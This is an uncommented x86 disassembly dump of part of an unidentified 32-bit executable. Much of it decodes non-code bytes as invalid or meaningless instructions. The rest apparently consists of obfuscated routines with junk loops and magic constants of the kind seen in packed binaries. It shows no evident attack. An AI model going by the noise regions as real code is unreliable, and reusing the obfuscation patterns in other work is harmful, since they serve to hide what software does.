  407d29:	cmp    DWORD PTR [ebx-0x315b2c15],ebp
  407d2f:	aam    0xe3
  407d31:	push   ebx
  407d32:	push   esi
  407d33:	adc    bl,0x0
  407d36:	mov    bl,0x92
  407d38:	out    dx,al
  407d39:	ror    BYTE PTR [ecx],0x1c
  407d3c:	jb     0x407db0
  407d3e:	adc    edx,0xffffffae
  407d41:	cwde   
  407d42:	fsubr  DWORD PTR [edx+0x1ff29584]
  407d48:	or     BYTE PTR [ebp-0x1e],bh
  407d4b:	loopne 0x407d24
  407d4d:	xchg   esp,eax
  407d4e:	pusha  
  407d4f:	mov    edx,0x9c4aa265
  407d54:	jg     0x407d07
  407d56:	pop    ebx
  407d57:	xchg   esi,eax
  407d58:	push   eax
  407d59:	mov    ah,0x7b
  407d5b:	lea    edx,[ebx]
  407d5d:	sub    al,0xde
  407d5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d60:	push   ebp
  407d61:	outs   dx,DWORD PTR ds:[esi]
  407d62:	inc    edx
  407d63:	call   0x8a05:0xaad7914b
  407d6a:	push   cs
  407d6b:	xlat   BYTE PTR ds:[ebx]
  407d6c:	jo     0x407dda
  407d6e:	js     0x407d3f
  407d70:	mov    ds,esi
  407d72:	outs   dx,DWORD PTR ds:[esi]
  407d73:	out    dx,al
  407d74:	push   ecx
  407d75:	pop    ecx
  407d76:	add    DWORD PTR [ecx+0x6],eax
  407d79:	gs leave 
  407d7b:	add    eax,0x2ce33612
  407d80:	sub    dl,dh
  407d82:	dec    ecx
  407d83:	ret    
  407d84:	xchg   ecx,eax
  407d85:	mov    WORD PTR [ecx+0x11d9462e],ds
  407d8b:	test   DWORD PTR [edi-0x44],ebx
  407d8e:	mov    ch,0x7a
  407d90:	ins    BYTE PTR es:[edi],dx
  407d91:	cmp    DWORD PTR [edx],edx
  407d93:	mov    ebx,0xf7e2a259
  407d98:	jo     0x407d77
  407d9a:	add    BYTE PTR [eax+0x7b],bl
  407d9d:	sar    ch,cl
  407d9f:	call   0xc0e6:0xedfa8bc7
  407da6:	mov    esi,0xbe20904e
  407dab:	jmp    0xc336:0x2fa78a4f
  407db2:	fisubr DWORD PTR [ebx-0x1d0eaae5]
  407db8:	sbb    BYTE PTR [ebx+eax*4-0x3c],ch
  407dbc:	jo     0x407ddc
  407dbe:	jnp    0x407e25
  407dc0:	mov    ds:0x2304de48,eax
  407dc5:	push   ecx
  407dc6:	add    edi,ebx
  407dc8:	(bad)  
  407dc9:	mov    edi,0x69f639b8
  407dce:	fst    QWORD PTR [ebp-0x33]
  407dd1:	sahf   
  407dd2:	sbb    al,0xfb
  407dd4:	jmp    0x61e8:0x140f5090
  407ddb:	or     ebp,DWORD PTR [edi]
  407ddd:	es mov edx,0xca38fbac
  407de3:	(bad)
  407de7:	shl    BYTE PTR [ebx+0x27],0x7b
  407deb:	and    bh,BYTE PTR [eax]
  407ded:	mov    dh,ch
  407def:	xor    eax,0x9476eee4
  407df4:	loop   0x407e02
  407df6:	outs   dx,BYTE PTR ds:[esi]
  407df7:	mov    esp,0x6207d033
  407dfc:	cmp    edi,DWORD PTR [ebp-0x55]
  407dff:	mov    ebp,DWORD PTR [eax]
  407e01:	ret    
  407e02:	sbb    bh,BYTE PTR [ecx-0x1d]
  407e05:	mov    ah,0x28
  407e07:	sbb    al,0x71
  407e09:	mov    DWORD PTR ss:[esp+eax*1+0x43636f0],0xd0138b3e
  407e15:	or     bh,al
  407e17:	or     ebx,ebp
  407e19:	xchg   edi,eax
  407e1a:	or     al,0x2
  407e1c:	cmp    DWORD PTR [esi-0x2343d6a5],edx
  407e22:	xor    BYTE PTR [edx-0x9],0x1b
  407e26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e27:	xor    al,0x9d
  407e29:	push   eax
  407e2a:	dec    ebp
  407e2b:	mov    edx,DWORD PTR [eax]
  407e2d:	adc    BYTE PTR ds:0x29c914b6,dl
  407e33:	jno    0x407e1f
  407e35:	xor    al,0xac
  407e37:	scas   eax,DWORD PTR es:[edi]
  407e38:	test   DWORD PTR [edi],ecx
  407e3a:	addr16 int 0xcf
  407e3d:	adc    al,0x6c
  407e3f:	mov    dl,0x9d
  407e41:	cmp    eax,0xbfb82302
  407e46:	cdq    
  407e47:	pop    edx
  407e48:	mov    al,BYTE PTR [ecx+0x34]
  407e4b:	adc    ch,BYTE PTR [edi+0x9]
  407e4e:	out    0x33,eax
  407e50:	mov    esi,0xba3629e
  407e55:	pop    esi
  407e56:	(bad)  
  407e57:	pop    ebx
  407e58:	les    ecx,FWORD PTR [ebp+0x64275929]
  407e5e:	xor    al,0x9b
  407e60:	inc    ebx
  407e61:	mov    DWORD PTR [eax],edx
  407e63:	mov    eax,DWORD PTR [ebp-0xc]
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43376b
  407f81:	or     DWORD PTR ds:0x43376f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4337d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4337d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43381b
  407fad:	sub    DWORD PTR ds:0x4337a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43375b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4337ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4337ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4337ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4337ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4337ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4339e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4337ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4337ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4337ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4337ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4337ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4337ab,ebx
  408048:	cmp    DWORD PTR ds:0x4337ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4337ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4337ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4337ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4337ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4336fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4337db
  4080b1:	and    DWORD PTR ds:0x4337e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43379b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433823,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433823
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433823,ebx
  4080e3:	cmp    DWORD PTR ds:0x433823,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4337db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433823,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433823
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433823,ebx
  40811d:	cmp    DWORD PTR ds:0x433823,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433817,0x1f
  40813b:	cmp    DWORD PTR ds:0x433817,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433817,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433817
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433817,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x924d8e0d
  408191:	dec    esp
  408192:	ds retf 0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	fdivr  DWORD PTR ss:[ebp-0x47245535]
  4081a1:	push   0xb1bc11c1
  4081a6:	and    DWORD PTR [edx+0x20],esi
  4081a9:	pop    edx
  4081aa:	mul    DWORD PTR [eax-0x27]
  4081ad:	and    bh,ah
  4081af:	in     eax,0x61
  4081b1:	xchg   ecx,eax
  4081b2:	xchg   ebx,ebp
  4081b4:	imul   ecx,edi,0xab619994
  4081ba:	or     al,0x6e
  4081bc:	int    0x31
  4081be:	jb     0x4081ac
  4081c0:	pop    ds
  4081c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081c2:	gs add al,0x49
  4081c5:	dec    ecx
  4081c6:	push   cs
  4081c7:	scas   eax,DWORD PTR es:[edi]
  4081c8:	dec    edi
  4081c9:	inc    ebp
  4081ca:	mov    dl,0x72
  4081cc:	sahf   
  4081cd:	push   cs
  4081ce:	cmp    DWORD PTR [ecx],ebp
  4081d0:	lea    edi,[ebx+0xc]
  4081d3:	mov    dl,0x50
  4081d5:	addr16 xchg ebp,eax
  4081d7:	mov    WORD PTR [eax+0x4de996e],?
  4081dd:	inc    ebp
  4081de:	in     eax,dx
  4081df:	add    eax,0x89bba1d3
  4081e4:	mov    eax,ds:0xcbf697cf
  4081e9:	jno    0x4081ef
  4081eb:	mov    ss,WORD PTR [esi-0x66a28d78]
  4081f1:	dec    ecx
  4081f2:	sbb    eax,0xceaf15a2
  4081f7:	jp     0x40819e
  4081f9:	pop    ds
  4081fa:	sbb    al,0xec
  4081fc:	push   ebp
  4081fd:	push   esi
  4081fe:	pop    ecx
  4081ff:	pop    ecx
  408200:	push   0x5d
  408202:	jecxz  0x408276
  408204:	adc    al,0x59
  408206:	jne    0x4081ac
  408208:	jg     0x408241
  40820a:	xor    DWORD PTR [edx+0x5b],ebx
  40820d:	or     ecx,DWORD PTR [esi-0x1e]
  408210:	sti    
  408211:	adc    ah,BYTE PTR [esi]
  408213:	addr16 pop esi
  408215:	addr16 or al,0x2
  408218:	inc    esp
  408219:	dec    eax
  40821a:	mov    ebp,0x95a59927
  40821f:	repz jg 0x4081e2
  408222:	mov    al,0x32
  408224:	fsubr  QWORD PTR [edi]
  408226:	retf   
  408227:	lods   al,BYTE PTR ds:[esi]
  408228:	(bad)  
  408229:	sbb    ebx,DWORD PTR gs:[ecx]
  40822c:	xchg   edx,eax
  40822d:	mov    esi,0xe0ee97e3
  408232:	scas   al,BYTE PTR es:[edi]
  408233:	sbb    al,0x65
  408235:	add    bh,BYTE PTR [edx+edx*1-0x4812c48b]
  40823c:	push   edi
  40823d:	sbb    eax,0x201b9ba6
  408242:	push   esp
  408243:	ins    BYTE PTR es:[edi],dx
  408244:	cmp    eax,0x25ec3267
  408249:	(bad)  
  40824a:	push   eax
  40824b:	mov    edx,0x2f121e46
  408250:	aaa    
  408251:	sbb    DWORD PTR [ebx+0x7d59f622],esp
  408257:	push   edx
  408258:	mov    ch,0xd1
  40825a:	pop    es
  40825b:	mov    ecx,DWORD PTR [esi+esi*2-0x68]
  40825f:	mov    DWORD PTR [esi-0x7b],esp
  408262:	pop    ebp
  408263:	pop    edx
  408264:	xor    BYTE PTR [esi],dl
  408266:	push   esp
  408267:	xor    edx,DWORD PTR [ebp-0x31]
  40826a:	fidiv  DWORD PTR [eax]
  40826c:	mov    ss,WORD PTR [edi+esi*8+0x54addcba]
  408273:	pusha  
  408274:	xor    ebx,DWORD PTR [eax+ebp*1+0x36ec6454]
  40827b:	test   cl,0x70
  40827e:	jo     0x408273
  408280:	aad    0xe2
  408282:	jecxz  0x4082e5
  408284:	stc    
  408285:	(bad)  
  408286:	cmp    BYTE PTR [edx+0x270f8074],al
  40828c:	add    DWORD PTR [ebp+0x6b01099c],edi
  408292:	(bad)  
  408293:	jmp    0x10ca:0xa1a88077
  40829a:	inc    eax
  40829b:	and    BYTE PTR [edx+0x36f45163],ah
  4082a1:	repnz sub al,0x55
  4082a4:	adc    bl,BYTE PTR [eax]
  4082a6:	scas   al,BYTE PTR es:[edi]
  4082a7:	cmp    bl,BYTE PTR [ebp+0x51]
  4082aa:	add    al,0xee
  4082ac:	cmp    BYTE PTR [ebp+0x7ff9931f],al
  4082b2:	in     al,dx
  4082b3:	retf   0x26f0
  4082b6:	pop    ebx
  4082b7:	push   eax
  4082b8:	fucomi st,st(1)
  4082ba:	ja     0x408296
  4082bc:	cmp    al,0xf1
  4082be:	and    dl,ah
  4082c0:	ret    0x581f
  4082c3:	pushf  
  4082c4:	and    BYTE PTR [eax+0x726fe1ca],dh
  4082ca:	mov    eax,0x76083cf8
  4082cf:	adc    eax,0x18c728de
  4082d4:	mov    ds:0xc3956df,eax
  4082d9:	ins    DWORD PTR es:[edi],dx
  4082da:	and    ecx,0x1feab608
  4082e0:	inc    edx
  4082e1:	retf   0x9c0
  4082e4:	cs adc al,0x14
  4082e7:	pushf  
  4082e8:	adc    al,0x2f
  4082ea:	in     eax,dx
  4082eb:	push   eax
  4082ec:	mov    ebx,0xcbb76021
  4082f1:	xor    dh,al
  4082f3:	dec    edi
  4082f4:	aas    
  4082f5:	bound  esp,QWORD PTR [eax+0x33cb3001]
  4082fb:	je     0x40828e
  4082fd:	retf   0xe80f
  408300:	push   edx
  408301:	sub    DWORD PTR [eax],eax
  408303:	mov    ecx,0xc2e6d4d5
  408308:	sbb    ch,BYTE PTR [edx+0x5b]
  40830b:	inc    ebx
  40830c:	cmp    ebp,0xe
  40830f:	retf   0xa9bb
  408312:	cld    
  408313:	pop    es
  408314:	lock mov cl,0x25
  408317:	pop    esp
  408318:	imul   edi,DWORD PTR ds:0x35458924,0x8
  40831f:	cmp    ebx,ecx
  408321:	mov    esi,0xbbfb86e9
  408326:	gs pop esp
  408328:	mov    edx,0x94212374
  40832d:	xchg   esp,eax
  40832e:	jmp    0x408335
  408330:	sbb    bl,ah
  408332:	pop    edi
  408333:	inc    edi
  408334:	inc    edx
  408335:	mov    ds:0x131c50cd,eax
  40833a:	inc    esi
  40833b:	xchg   ebp,ecx
  40833d:	cmc    
  40833e:	int3   
  40833f:	les    eax,FWORD PTR [esi+eiz*1-0x1765b96e]
  408346:	xchg   edi,eax
  408347:	inc    eax
  408348:	xlat   BYTE PTR ds:[ebx]
  408349:	lahf   
  40834a:	sahf   
  40834b:	shr    BYTE PTR [esi-0x5],cl
  40834e:	xlat   BYTE PTR ds:[ebx]
  40834f:	test   al,0x87
  408351:	arpl   WORD PTR [ebx+0x62b592f2],bp
  408357:	push   ebp
  408358:	sbb    DWORD PTR [esi-0x6d2ca869],eax
  40835e:	inc    ebx
  40835f:	sub    cl,BYTE PTR [esi]
  408361:	push   edx
  408362:	or     edx,DWORD PTR [ebx+0x2d]
  408365:	addr16 out dx,al
  408367:	inc    edi
  408368:	pop    edx
  408369:	cld    
  40836a:	and    esi,DWORD PTR [ebx-0x10fe0905]
  408370:	add    ecx,DWORD PTR cs:[ebp-0x7f3f531a]
  408377:	sub    eax,0xb709f524
  40837c:	lds    esp,FWORD PTR [edx-0x71f78738]
  408382:	out    dx,eax
  408383:	jbe    0x40834d
  408385:	je     0x40832e
  408387:	cmp    BYTE PTR [eax],bh
  408389:	arpl   bp,cx
  40838b:	or     bh,BYTE PTR [ebp-0x57]
  40838e:	jno    0x4083e1
  408390:	mov    cl,0xd6
  408392:	and    al,0x30
  408394:	fisubr WORD PTR [ebx-0x24]
  408397:	aam    0x6d
  408399:	in     eax,dx
  40839a:	fst    st(5)
  40839c:	xor    eax,0x76a0bc23
  4083a1:	cmp    bl,BYTE PTR [ecx+0x4f3beb7c]
  4083a7:	mov    ebp,0x125a7b32
  4083ac:	add    ecx,DWORD PTR [esi+0x6354e3d0]
  4083b2:	adc    al,BYTE PTR [edi+0x5e98c49d]
  4083b8:	cmc    
  4083b9:	cmp    ebp,eax
  4083bb:	sbb    al,0x1f
  4083bd:	jb     0x40835a
  4083bf:	cmp    eax,0x60e31f0
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x43375b,0x0
  4083d1:	mov    eax,ds:0x43375b
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43375b,eax
  4083dc:	cmp    DWORD PTR ds:0x43375b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43375b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43375b
  40840c:	inc    eax
  40840d:	mov    ds:0x43375b,eax
  408412:	cmp    DWORD PTR ds:0x43375b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43370b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433713,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433827
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	mov    edi,0xe435ad48
  408469:	enter  0x7e7e,0x24
  40846d:	jl     0x4084ed
  40846f:	jle    0x408466
  408471:	sahf   
  408472:	inc    edi
  408473:	cmovge ebp,DWORD PTR [esi+0x37]
  408477:	sahf   
  408478:	mov    bl,0x35
  40847a:	sbb    al,0xe8
  40847c:	push   0xffffff8d
  40847e:	addr16 pop es
  408480:	dec    eax
  408481:	aaa    
  408482:	mov    WORD PTR [eax+ebp*4+0x6a],?
  408486:	inc    ebp
  408487:	push   esp
  408488:	int    0xd6
  40848a:	dec    eax
  40848b:	jg     0x408441
  40848d:	xchg   edi,eax
  40848e:	mov    bl,0x34
  408490:	aas    
  408491:	inc    edx
  408492:	aad    0x67
  408494:	jmp    0x7b21c87d
  408499:	mov    ecx,DWORD PTR ss:[edx-0xd]
  40849d:	jg     0x408466
  40849f:	lahf   
  4084a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084a1:	and    DWORD PTR [edx-0x5b],ebp
  4084a4:	js     0x4084ec
  4084a6:	stos   DWORD PTR es:[edi],eax
  4084a7:	jle    0x40842f
  4084a9:	inc    eax
  4084aa:	pop    ds
  4084ab:	daa    
  4084ac:	sbb    edx,DWORD PTR [eax-0x6b6fc980]
  4084b2:	idiv   BYTE PTR [edx+0x37c80021]
  4084b8:	mov    ebp,0x14d05502
  4084bd:	(bad)
  4084c0:	adc    BYTE PTR [eax-0x29],0x62
  4084c4:	inc    esp
  4084c5:	ins    BYTE PTR es:[edi],dx
  4084c6:	aas    
  4084c7:	(bad)  [esp+eiz*4+0x490ef5db]
  4084ce:	arpl   WORD PTR [ecx+0x10],bp
  4084d1:	es pushf 
  4084d3:	xchg   ebx,eax
  4084d4:	neg    dh
  4084d6:	icebp  
  4084d7:	push   ebp
  4084d8:	in     al,0x46
  4084da:	mov    edx,0xf78b4d6f
  4084df:	or     BYTE PTR [edx-0x6ff09cd5],dl
  4084e5:	or     eax,esi
  4084e7:	pushf  
  4084e8:	jns    0x408500
  4084ea:	mov    bh,0xa
  4084ec:	repz jo 0x408493
  4084ef:	dec    ebx
  4084f0:	outs   dx,DWORD PTR ds:[esi]
  4084f1:	ins    DWORD PTR es:[edi],dx
  4084f2:	or     DWORD PTR [edx+0x58],ebx
  4084f5:	sub    DWORD PTR ds:0x13de0940,esi
  4084fb:	sbb    BYTE PTR [ecx+0x447c8ddd],bh
  408501:	jge    0x408549
  408503:	mov    ch,0xf3
  408505:	xchg   edi,eax
  408506:	lods   eax,DWORD PTR ds:[esi]
  408507:	sbb    DWORD PTR [esi-0x80],ebx
  40850a:	pop    edi
  40850b:	dec    edi
  40850c:	inc    esp
  40850d:	inc    edi
  40850e:	dec    edx
  40850f:	(bad)  
  408510:	sbb    ebx,DWORD PTR [ecx+0x28]
  408513:	and    DWORD PTR [esi],ecx
  408515:	es scas eax,DWORD PTR es:[edi]
  408517:	jecxz  0x4084ed
  408519:	xchg   esi,eax
  40851a:	pop    ebp
  40851b:	mov    ds:0x9290d223,eax
  408520:	push   eax
  408521:	(bad)  
  408522:	sti    
  408523:	mov    ds:0xdf6d55ad,al
  408528:	xor    al,0x38
  40852a:	leave  
  40852b:	pop    esp
  40852c:	lea    esi,[esi+0x5c]
  40852f:	mov    esi,0x7fabd809
  408534:	fldenv [ebp-0x4]
  408537:	sar    BYTE PTR [ebp+ebp*4-0x29f02abd],0x12
  40853f:	dec    eax
  408540:	test   BYTE PTR [ebp+0x10abae57],bh
  408546:	sub    ebp,DWORD PTR [ebp-0x7227bf9e]
  40854c:	rcr    BYTE PTR [ebx],cl
  40854e:	daa    
  40854f:	and    BYTE PTR [edi+0x37377ea1],ch
  408555:	xchg   esp,eax
  408556:	out    dx,eax
  408557:	adc    BYTE PTR [eax+ebx*2-0x7f],ch
  40855b:	jb     0x4084eb
  40855d:	bound  esi,QWORD PTR [edi+0x5f]
  408560:	sbb    eax,0x85f14b28
  408565:	push   ss
  408566:	pusha  
  408567:	push   edi
  408568:	inc    edi
  408569:	dec    edx
  40856a:	call   0x52c36369
  40856f:	jne    0x4085ef
  408571:	push   edi
  408572:	mov    ah,0xb5
  408574:	loopne 0x408524
  408576:	clc    
  408577:	jp     0x408581
  408579:	in     al,0x9
  40857b:	cmp    eax,0x6c66d09c
  408580:	lahf   
  408581:	xchg   esp,eax
  408582:	sub    eax,0xb5e26058
  408587:	stos   DWORD PTR es:[edi],eax
  408588:	out    0x1b,eax
  40858a:	mov    eax,0x7ada2933
  40858f:	jle    0x408568
  408591:	xor    eax,0x6f49d13f
  408596:	loopne 0x408549
  408598:	and    eax,0x1ac2aa05
  40859d:	ja     0x4085b8
  40859f:	inc    edx
  4085a0:	clc    
  4085a1:	pop    ecx
  4085a2:	cwde   
  4085a3:	pop    esp
  4085a4:	sub    dl,al
  4085a6:	or     ch,BYTE PTR [esi]
  4085a8:	loope  0x408600
  4085aa:	mov    BYTE PTR [esi],ah
  4085ac:	xor    al,0xb2
  4085ae:	(bad)  
  4085b0:	out    0xad,al
  4085b2:	and    al,0x62
  4085b4:	aaa    
  4085b5:	bound  edx,QWORD PTR [ecx-0x44]
  4085b8:	inc    ebp
  4085b9:	aam    0x73
  4085bb:	pop    esp
  4085bc:	or     ebx,DWORD PTR [edx+0x55286f4d]
  4085c2:	mov    ebx,0xcfa25728
  4085c7:	or     cl,BYTE PTR [eax+0x75]
  4085ca:	test   al,0x25
  4085cc:	std    
  4085cd:	and    BYTE PTR [esi+esi*8-0x2870f7e0],bl
  4085d4:	sub    al,0x9d
  4085d6:	inc    edx
  4085d7:	gs aad 0x35
  4085da:	push   edx
  4085db:	sbb    eax,0x8def75dc
  4085e0:	aas    
  4085e1:	mov    edi,0xc77e52fe
  4085e6:	sbb    DWORD PTR [ecx-0x56e9f372],esi
  4085ec:	jne    0x4085a1
  4085ee:	push   ss
  4085ef:	cmp    al,0x78
  4085f1:	dec    ebp
  4085f2:	js     0x40859a
  4085f4:	jl     0x40863e
  4085f6:	ins    BYTE PTR es:[edi],dx
  4085f7:	cld    
  4085f8:	sbb    DWORD PTR [ebp+0x6b],ebx
  4085fb:	ret    
  4085fc:	fcom   QWORD PTR [ebx+0x6705b49d]
  408602:	xor    al,0x23
  408604:	and    edx,DWORD PTR [eax]
  408606:	pop    ebp
  408607:	sbb    eax,0x319b27ea
  40860c:	xor    cl,BYTE PTR [edi-0x7733e51c]
  408612:	out    0x7f,al
  408614:	mov    ecx,0x3725ef57
  408619:	sub    ecx,DWORD PTR ds:0xef0661e0
  40861f:	push   0x3cca35de
  408624:	or     eax,DWORD PTR [esp+esi*1+0x7bc3ef13]
  40862b:	fcomp  QWORD PTR [ecx+0x674637b2]
  408631:	loopne 0x40861a
  408633:	or     DWORD PTR [edi+0x24],ebp
  408636:	iret   
  408637:	mov    cl,0x86
  408639:	mov    eax,0x9e1589db
  40863e:	add    BYTE PTR [ecx+edx*4+0x2a],ch
  408642:	mov    ebx,?
  408644:	xchg   BYTE PTR [esi-0x487483c3],al
  40864a:	dec    esp
  40864b:	mov    dl,BYTE PTR ds:0x9e9767ca
  408651:	fs xchg ecx,eax
  408653:	out    0x8e,eax
  408655:	mov    ch,0xe4
  408657:	clc    
  408658:	mov    edi,0xdb65963
  40865d:	lods   al,BYTE PTR ds:[esi]
